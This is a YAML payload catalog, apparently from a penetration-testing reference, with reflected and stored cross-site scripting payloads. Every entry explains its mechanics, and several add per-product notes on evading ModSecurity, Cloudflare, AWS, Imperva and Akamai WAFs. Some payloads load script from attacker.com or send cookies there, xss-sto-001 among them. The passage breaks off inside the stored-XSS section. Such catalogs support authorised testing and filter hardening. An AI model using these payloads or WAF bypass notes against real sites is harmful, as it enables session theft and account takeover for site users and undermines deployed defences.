slug: xss
name: Cross-Site Scripting (XSS)
owasp: A03:2021 – Injection
description: 'Cross-Site Scripting occurs when an attacker injects malicious scripts into web pages viewed by other users.
  The browser executes the injected script in the context of the vulnerable site, granting the attacker access to session
  tokens, cookies, and DOM data. XSS can lead to account takeover, credential harvesting, and full client-side compromise.

  '
severity_range:
  low: CVSS 4.0-5.9
  high: CVSS 8.0-9.8
references:
- label: OWASP XSS Prevention Cheat Sheet
  url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- label: PortSwigger XSS Research
  url: https://portswigger.net/web-security/cross-site-scripting
- label: OWASP Top 10 A03 Injection
  url: https://owasp.org/Top10/A03_2021-Injection/
groups:
- slug: reflected
  name: Reflected XSS
  description: Input is immediately echoed back in the HTTP response without sanitization, executing in the victim's browser
    when they visit a crafted URL.
  difficulty: medium
  prerequisites:
  - User-controlled input is reflected in HTTP response
  - No output encoding on the reflection point
  payloads:
  - id: xss-ref-001
    title: Basic script tag alert
    payload_string: <script>alert(1)</script>
    how_it_works: 'The browser''s HTML parser encounters the <script> tag and hands control to the JavaScript engine, which
      immediately executes the enclosed code. Because the script runs in the origin of the vulnerable page, it has full access
      to that page''s DOM, cookies, and localStorage. An attacker delivers this via a crafted link sent to a victim. Upon
      click the victim''s session cookies can be exfiltrated to an attacker-controlled server.

      '
    prerequisites:
    - Input reflected without HTML encoding
    waf_bypass_notes: Blocked by most WAFs; use case variation or event handler variants
    waf_notes_by_product:
    - waf: ModSecurity CRS
      blocked: true
      bypass: CRS rules 941100/941110 (XSS-Libinjection and script-tag) block this; switch to event handler payloads that
        omit the script keyword entirely
      alt: xss-ref-002 (img onerror)
    - waf: Cloudflare WAF
      blocked: true
      bypass: ML-based XSS detection; try Unicode normalisation or mixed-case variants (sCrIpT); effectiveness varies by site
        sensitivity setting
      alt: xss-ref-010 (case bypass)
    - waf: AWS WAF (XSS managed ruleset)
      blocked: true
      bypass: AWS XSS rule group pattern-matches <script>; HTML entity encoding of angle brackets (&#60;script&#62;) may evade
        static rules but not all deployments
      alt: xss-ref-012 (entity encoded)
    - waf: Imperva (AppTrana / SecureSphere)
      blocked: true
      bypass: Imperva ThreatRadar signatures cover script tags; attribute-injection payloads without script keyword are less
        consistently detected
      alt: xss-ref-014 (attribute injection)
    - waf: Akamai Kona Site Defender
      blocked: true
      bypass: Akamai KSD rule sets block common XSS patterns; low-frequency HTML5 events (ontoggle, onanimationstart) are
        less reliably in rule sets
      alt: xss-ref-006 (details ontoggle)
    severity_context: CVSS 6.1 – attacker executes JavaScript in victim browser context
    cve_refs: []
    tags:
    - reflected
    - basic
    - script-tag
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-002
    title: Image onerror event
    payload_string: '"><img src=x onerror=alert(1)>'
    how_it_works: 'The double-quote breaks out of the enclosing HTML attribute context, closing the prior tag. The injected
      img tag references a nonexistent image resource ''x'', causing the browser to fire the onerror event handler. This executes
      arbitrary JavaScript without requiring a script element, bypassing filters that block the word ''script''. The attacker
      can replace alert(1) with a payload to steal cookies or perform DOM manipulation.

      '
    prerequisites:
    - Input reflected inside an HTML attribute or after a tag
    waf_bypass_notes: Many WAFs miss this; obfuscate 'onerror' with HTML entities if needed. PHP htmlspecialchars() with default
      ENT_COMPAT flags escapes double-quotes as &quot;, blocking this specific payload in double-quoted attribute contexts
      — but developers must use ENT_QUOTES to also cover single-quoted attribute contexts, or the variant with a leading single-quote
      remains exploitable.
    waf_notes_by_product:
    - waf: ModSecurity CRS
      blocked: false
      bypass: CRS rule 941110 targets the script keyword; img/onerror avoids it. Rule 941160 may catch onerror= but is often
        disabled due to false positives on legitimate pages
      alt: No alternative needed — this payload bypasses ModSec CRS by default
    - waf: Cloudflare WAF
      blocked: partial
      bypass: Cloudflare detects common event-handler patterns; use onfocus with autofocus, or ontoggle on a details element,
        which are lower-frequency in Cloudflare signatures
      alt: xss-ref-005 (autofocus onfocus)
    - waf: AWS WAF (XSS managed ruleset)
      blocked: partial
      bypass: AWS CrossSiteScripting_BODY rule matches common event handlers; switching to less common events (onpointerover,
        onanimationstart) may bypass rule matching
      alt: xss-ref-006 (details ontoggle)
    - waf: Imperva (AppTrana / SecureSphere)
      blocked: partial
      bypass: img/onerror is a well-known pattern; try <video><source onerror=> or <input onfocus autofocus> as less-detected
        alternatives
      alt: xss-ref-013 (video source onerror)
    - waf: Akamai Kona Site Defender
      blocked: partial
      bypass: Akamai behavioral detection; space-separated attribute syntax or obfuscating onerror with HTML entities (on&#101;rror)
        reduces signature match confidence
      alt: xss-ref-008 (body onpageshow)
    severity_context: CVSS 6.1 – JavaScript execution in victim browser
    cve_refs: []
    tags:
    - reflected
    - event-handler
    - img-tag
    - attribute-escape
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-003
    title: SVG onload payload
    payload_string: <svg onload=alert(1)>
    how_it_works: 'SVG is an XML-based vector image format that browsers render inline as part of the DOM. The onload event
      fires as soon as the SVG element is parsed, executing attached JavaScript. This bypasses filters that only block ''script''
      tags while allowing image tags. SVG payloads are short, reliable across browsers, and particularly useful in contexts
      where character length is limited.

      '
    prerequisites:
    - Input reflected in HTML body context
    waf_bypass_notes: Try <SVG/onload=alert(1)> or uppercase variants
    severity_context: CVSS 6.1 – reliable cross-browser XSS execution
    cve_refs: []
    tags:
    - reflected
    - svg
    - onload
    - short-payload
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-004
    title: Script tag with src
    payload_string: <script src=//attacker.com/x.js></script>
    how_it_works: 'Rather than embedding JavaScript inline, this loads an external script from an attacker-controlled server.
      This allows arbitrarily large payloads and makes detection harder since the malicious code is not present in the reflected
      response. The attacker can update the remote script dynamically after delivery. SSL-relative URLs (//host) work over
      both HTTP and HTTPS, maximizing compatibility.

      '
    prerequisites:
    - Input reflected without sanitization
    - CSP does not restrict script-src
    waf_bypass_notes: Replace with attacker domain; some WAFs block external domains
    severity_context: CVSS 8.0 – loads arbitrary remote code into victim browser
    cve_refs: []
    tags:
    - reflected
    - external-script
    - remote-load
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-005
    title: Input autofocus onfocus
    payload_string: <input autofocus onfocus=alert(1)>
    how_it_works: 'The autofocus attribute causes the browser to automatically focus the input element immediately upon page
      load without any user interaction. This triggers the onfocus event handler, executing the attached JavaScript. This
      technique is valuable in contexts where onload or onerror may be filtered because it uses a less-commonly blocked event.
      It requires no user interaction beyond loading the page, making it fully reliable.

      '
    prerequisites:
    - Input reflected in HTML body context
    waf_bypass_notes: Use tabindex=1 autofocus as alternative trigger
    severity_context: CVSS 6.1 – no user interaction required beyond page load
    cve_refs: []
    tags:
    - reflected
    - autofocus
    - onfocus
    - no-interaction
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-006
    title: Details ontoggle
    payload_string: <details open ontoggle=alert(1)>
    how_it_works: 'The HTML5 details element, when opened, fires an ontoggle event. Combining the ''open'' attribute with
      the ontoggle handler triggers execution automatically without user interaction. This is a relatively novel vector that
      many WAF signatures do not cover. It works in all modern browsers and is particularly useful when common event handlers
      like onload or onerror are being filtered.

      '
    prerequisites:
    - Input reflected in HTML body context
    - Browser supports HTML5 details element
    waf_bypass_notes: Rarely blocked; reliable bypass for legacy WAF rulesets
    severity_context: CVSS 6.1 – browser-native HTML5 XSS vector
    cve_refs: []
    tags:
    - reflected
    - html5
    - ontoggle
    - waf-bypass
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-007
    title: Anchor href javascript URI
    payload_string: <a href=javascript:alert(1)>click</a>
    how_it_works: 'The javascript: URI scheme executes JavaScript when the link is clicked. The browser evaluates the URI
      as a JavaScript expression in the current page context. This requires a user click, making it a user-interaction-required
      XSS. It is commonly effective in applications that allow HTML in user-supplied content such as comments or profile fields.
      Attackers typically disguise the link text to encourage clicks.

      '
    prerequisites:
    - 'href attribute accepts javascript: URIs'
    - User interaction (click) required
    waf_bypass_notes: 'Use &#106;avascript: or java&#9;script: to bypass string matching. PHP htmlspecialchars() applied to
      an href value will escape angle brackets and quotes but does NOT strip the javascript: protocol from a URL — attackers
      inject javascript: without any characters that htmlspecialchars() targets; defense requires explicit protocol allowlisting
      (e.g., filter_var with FILTER_VALIDATE_URL) or strip_tags() is also insufficient since this payload is an attribute
      value, not a tag.'
    severity_context: CVSS 5.4 – requires user click
    cve_refs: []
    tags:
    - reflected
    - javascript-uri
    - href
    - user-interaction
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-008
    title: Body onpageshow
    payload_string: <body onpageshow=alert(1)>
    how_it_works: 'The onpageshow event fires when a page is shown, including when navigating back to a cached page from the
      browser''s back-forward cache (bfcache). This is a less commonly filtered event compared to onload. In some cases it
      can trigger twice: once on initial load and once when the user returns via back navigation. It provides reliable execution
      in body tag injection contexts.

      '
    prerequisites:
    - Input injected into or near a body tag context
    waf_bypass_notes: onpageshow is rarely in WAF signatures; effective bypass
    severity_context: CVSS 6.1 – executes on page load and bfcache restore
    cve_refs: []
    tags:
    - reflected
    - body-tag
    - onpageshow
    - bfcache
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-009
    title: Marquee onstart
    payload_string: <marquee onstart=alert(1)>
    how_it_works: 'The marquee element is an obsolete HTML element still supported by most browsers for backwards compatibility.
      The onstart event fires when the marquee animation begins, which happens automatically without user interaction. Because
      it is a legacy element, many WAF signatures do not include it. This is a reliable fallback when common elements are
      blocked.

      '
    prerequisites:
    - Input reflected in HTML body context
    - Browser renders marquee element (all major browsers do)
    waf_bypass_notes: Legacy element often missed by WAFs; reliable low-detection payload
    severity_context: CVSS 6.1 – auto-executing legacy element XSS
    cve_refs: []
    tags:
    - reflected
    - marquee
    - legacy-element
    - waf-bypass
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-010
    title: Script tag case bypass
    payload_string: <ScRiPt>alert(1)</ScRiPt>
    how_it_works: 'HTML tag names are case-insensitive in HTML5. Browsers normalize tag names during parsing, so any case
      combination of ''script'' will execute as a script tag. This bypasses naive string matching filters that only check
      for lowercase ''script''. Mixed case does not affect browser execution but defeats simple keyword blocklists and some
      WAF rules.

      '
    prerequisites:
    - Filter uses case-sensitive matching for 'script'
    waf_bypass_notes: Bypasses simple case-sensitive filters; modern WAFs handle case folding
    waf_notes_by_product:
    - waf: ModSecurity CRS
      blocked: true
      bypass: CRS rules are case-insensitive (t:lowercase transform applied before matching); this does NOT bypass ModSec
        CRS — use a different evasion technique
      alt: xss-ref-002 (event handler, avoids script keyword)
    - waf: Cloudflare WAF
      blocked: true
      bypass: Cloudflare normalises case before matching; this payload is reliably detected. Target encoding or attribute
        injection instead
      alt: xss-ref-014 (attribute injection)
    - waf: AWS WAF (XSS managed ruleset)
      blocked: partial
      bypass: AWS rule group applies case folding; effectiveness depends on how quickly AWS pushes rule updates. Use event-handler
        payloads as fallback
      alt: xss-ref-005 (autofocus onfocus)
    - waf: Imperva (AppTrana / SecureSphere)
      blocked: partial
      bypass: Imperva normalises case; combining case variation with URL encoding (%53cript) may defeat older signature versions
      alt: xss-ref-011 (double URL encoded)
    - waf: Akamai Kona Site Defender
      blocked: partial
      bypass: Akamai applies case folding in most rule groups; mixed with null bytes or HTML comments between letters may
        reduce rule confidence in some configurations
      alt: xss-ref-003 (SVG onload, no script keyword)
    severity_context: CVSS 6.1 – filter bypass technique
    cve_refs: []
    tags:
    - reflected
    - case-bypass
    - script-tag
    - filter-evasion
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-011
    title: Double URL encoded script tag
    payload_string: '%253Cscript%253Ealert(1)%253C%252Fscript%253E'
    how_it_works: 'Double URL encoding represents characters as percent-encoded sequences where the percent sign itself is
      also encoded (%25 = %). If the application performs URL decoding once server-side and then reflects the result, a second
      decoding by the browser produces the raw script tag. This is effective against filters that decode input once before
      checking it. The server must be performing URL decoding and then reflecting without re-encoding.

      '
    prerequisites:
    - Server performs single URL decode then reflects
    - Browser performs second decode
    waf_bypass_notes: Effective against WAFs that decode once; some normalize before matching. PHP applications that call
      urldecode() or rawurldecode() before applying htmlspecialchars() or strip_tags() will sanitize the percent-encoded form,
      not the decoded result; htmlspecialchars() with ENT_QUOTES must be applied after all decoding steps, not before, to
      prevent double-encoded payloads from surviving the filter chain.
    severity_context: CVSS 6.1 – double-decode filter bypass
    cve_refs: []
    tags:
    - reflected
    - double-encoding
    - url-encode
    - filter-evasion
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-012
    title: HTML entity encoded script
    payload_string: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'
    how_it_works: 'HTML entity encoding represents characters as their hexadecimal Unicode code point equivalents. If the
      application outputs user data into a context where the browser performs HTML entity decoding before execution (such
      as within certain attribute values or innerHTML assignments), these entities expand to the raw characters. This bypasses
      filters that scan for literal angle brackets or the string ''script''.

      '
    prerequisites:
    - Application reflects HTML entities without re-encoding
    - Browser decodes entities in the reflection context
    waf_bypass_notes: Works when WAF scans raw input but app decodes entities before use. PHP applications that call html_entity_decode()
      or htmlspecialchars_decode() on stored content before re-displaying it can expand these entities back to executable
      form; htmlspecialchars() with ENT_QUOTES must be the final encoding step at output time, not applied at input time,
      to neutralise entity-encoded payloads stored in the database.
    severity_context: CVSS 6.1 – entity encoding filter bypass
    cve_refs: []
    tags:
    - reflected
    - html-entities
    - encoding-bypass
    - filter-evasion
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-013
    title: Video poster onerror
    payload_string: <video><source onerror=alert(1)></video>
    how_it_works: 'The video element''s nested source tag fires an onerror event when the media source fails to load. Since
      no valid source is provided, the error fires immediately. This technique uses a less common element/event combination
      that many WAF signatures overlook. The video and source elements are standard HTML5 and supported in all modern browsers,
      making this a highly compatible alternative vector.

      '
    prerequisites:
    - Input reflected in HTML body context
    waf_bypass_notes: video/source combination rarely in WAF signatures
    severity_context: CVSS 6.1 – HTML5 media element XSS
    cve_refs: []
    tags:
    - reflected
    - video-tag
    - onerror
    - html5
    - waf-bypass
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-014
    title: Attribute injection with closing quote
    payload_string: ''' onmouseover=''alert(1)'
    how_it_works: 'When input is reflected inside a single-quoted HTML attribute value, the leading apostrophe closes the
      attribute value and the injected event handler becomes a new attribute on the same element. Moving the mouse over any
      part of the element triggers the payload. This technique is effective when the reflection point is inside a single-quoted
      attribute like src='''' or value=''''. The trailing apostrophe closes the injected attribute cleanly.

      '
    prerequisites:
    - Input reflected inside single-quoted HTML attribute
    waf_bypass_notes: Quote type must match reflection context; try both single and double. PHP htmlspecialchars() with its
      default ENT_COMPAT flag does NOT escape single quotes (apostrophes), leaving single-quoted attribute contexts fully
      vulnerable to this vector; developers must pass ENT_QUOTES (or ENT_HTML5) as the second argument, or additionally apply
      addslashes(), to prevent single-quote attribute injection in PHP applications.
    waf_notes_by_product:
    - waf: ModSecurity CRS
      blocked: false
      bypass: CRS does not have a specific rule blocking single-quote attribute escape followed by an event handler — the
        pattern avoids script keywords and stays within existing attribute context. Rule 941160 (no-script-name XSS) may not
        trigger
      alt: No alternative needed — ModSec CRS typically does not block this vector
    - waf: Cloudflare WAF
      blocked: partial
      bypass: Cloudflare ML may detect onmouseover in attribute context; substitute with onfocus and add autofocus attribute,
        or use ontouchstart on mobile-targeted tests
      alt: xss-ref-005 (autofocus onfocus, no mouse interaction required)
    - waf: AWS WAF (XSS managed ruleset)
      blocked: partial
      bypass: AWS XSS rule group matches common event handlers in attribute position; try onpointerenter or onanimationend
        which appear in fewer WAF signatures
      alt: xss-ref-008 (body onpageshow)
    - waf: Imperva (AppTrana / SecureSphere)
      blocked: partial
      bypass: Imperva may catch attribute-escape patterns; URL-encode the single quote (%27 onmouseover=) or use double-quote
        variant if the reflection is inside a double-quoted attribute
      alt: xss-ref-002 (double-quote break, onerror)
    - waf: Akamai Kona Site Defender
      blocked: false
      bypass: Akamai KSD less frequently blocks attribute-escape-based event handlers without script keyword; this payload
        may pass through depending on protection level configured
      alt: No bypass needed at default KSD protection level
    severity_context: CVSS 5.4 – requires mouse interaction
    cve_refs: []
    tags:
    - reflected
    - attribute-injection
    - event-handler
    - single-quote
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-015
    title: Iframe srcdoc payload
    payload_string: <iframe srcdoc='<script>alert(1)</script>'>
    how_it_works: 'The iframe srcdoc attribute allows specifying the HTML content of the iframe as an inline string. The browser
      parses and renders this HTML as a complete document within the iframe. Scripts in the srcdoc execute in a context that
      inherits the parent''s origin, giving them access to the parent page''s cookies and localStorage. This is an effective
      bypass when script tags in the main body are filtered but iframe attributes are not scrutinized.

      '
    prerequisites:
    - Input reflected in HTML body context
    - iframe tag not blocked
    waf_bypass_notes: srcdoc attribute is often missed; combine with HTML encoding for bypass
    severity_context: CVSS 6.1 – inherits parent origin for cookie access
    cve_refs: []
    tags:
    - reflected
    - iframe
    - srcdoc
    - waf-bypass
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-016
    title: Object data javascript URI
    payload_string: <object data=javascript:alert(1)>
    how_it_works: 'The object element''s data attribute, like anchor href, accepts javascript: URIs in some browser/context
      combinations. When rendered, the browser evaluates the URI as JavaScript. This is an older technique but remains in
      WAF bypass collections because it uses an element type that many automated filters do not associate with script execution.
      Browser support varies; Internet Explorer and older Chrome versions were particularly vulnerable.

      '
    prerequisites:
    - 'Browser evaluates javascript: URIs in object data attribute'
    - object element not blocked
    waf_bypass_notes: Browser support varies; test in target environment
    severity_context: CVSS 5.4 – browser-dependent execution
    cve_refs: []
    tags:
    - reflected
    - object-tag
    - javascript-uri
    - legacy
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: xss-ref-017
    title: Base tag injection
    payload_string: <base href=//attacker.com>
    how_it_works: 'Injecting a base tag changes the base URL for all relative links and resources on the page. After injection,
      any relative script src, link href, or form action resolves against the attacker''s domain. If the page loads any scripts
      using relative URLs after the injected base tag in the DOM, those scripts are fetched from the attacker''s server. This
      can lead to JavaScript execution without any direct XSS payload visible in the URL.

      '
    prerequisites:
    - Page loads relative-path resources after the injection point
    - Injection point is early in the document
    waf_bypass_notes: No JavaScript in payload; often bypasses XSS filters entirely
    severity_context: CVSS 7.4 – hijacks all relative resource loads on the page
    cve_refs: []
    tags:
    - reflected
    - base-tag
    - resource-hijack
    - indirect-xss
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
- slug: stored
  name: Stored XSS
  description: Malicious script is persisted in the application's data store and delivered to every user who views the affected
    content.
  difficulty: high
  prerequisites:
  - Application stores and re-renders user-supplied HTML or script
  - No sanitization on storage or output
  payloads:
  - id: xss-sto-001
    title: Script tag in comment field
    payload_string: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
    how_it_works: 'This payload stores a script tag in a persisted field such as a comment, profile bio, or post. Every subsequent
      user who loads the page containing this content triggers the script. The script redirects to an attacker-controlled
      URL appending the victim''s cookies as a query parameter. Unlike reflected XSS, stored XSS does not require the attacker
      to social-engineer a victim into clicking a link — it affects all visitors automatically.

      '
    prerequisites:
    - Application persists HTML in database and renders without encoding
    - Cookie not protected by HttpOnly flag
    waf_bypass_notes: WAF may inspect POST body; encode payload or use multipart upload. PHP applications often defend stored
      XSS by applying htmlspecialchars() on output, but this htmlspecialchars bypass succeeds whenever the function is omitted
      on a stored script rendering path — for example, developers calling htmlspecialchars without the ENT_QUOTES flag still
      allow stored script injection via single-quoted attributes, and any output that uses innerHTML or eval sidesteps htmlspecialchars
      entirely, allowing alert(1) or cookie-theft XSS payloads to execute from stored content.
    waf_notes_by_product:
    - waf: ModSecurity CRS
      blocked: partial
      bypass: CRS inspects request body (POST) but not database reads; stored XSS payloads already persisted bypass CRS entirely
        at render time because CRS has no response-body scanning by default
      alt: Store any XSS variant — ModSec CRS cannot block stored content on egress without response inspection enabled
    - waf: Cloudflare WAF
      blocked: partial
      bypass: Cloudflare inspects POST bodies and may block obvious script tags on write; payloads can be split across multiple
        write operations or stored base64-encoded and decoded on render
      alt: xss-sto-006 (JSON injection rendered via innerHTML — write path doesn't look like XSS)
    - waf: AWS WAF (XSS managed ruleset)
      blocked: partial
      bypass: AWS WAF inspects HTTP request bodies; does not scan application responses. Once stored, the payload executes
        freely. Obfuscate the write request to avoid input-time blocking
      alt: Use multipart upload or chunked encoding to defeat AWS WAF body inspection on write
    - waf: Imperva (AppTrana / SecureSphere)
      blocked: partial
      bypass: Imperva inspects writes; response-body scanning (virtual patching) can catch stored XSS on reads if configured.
        Standard deployment blocks write but not render
      alt: xss-sto-008 (mXSS mutation bypass — sanitiser-bypass technique effective if Imperva relies on server-side sanitisation)
    - waf: Akamai Kona Site Defender
      blocked: partial
      bypass: Akamai KSD applies client-side caching rules; stored XSS payloads in user-specific pages (not CDN-cached) are
        not inspected at render time. Block write via obfuscation
      alt: xss-sto-014 (template literal injection — less signature coverage in Akamai rule sets)
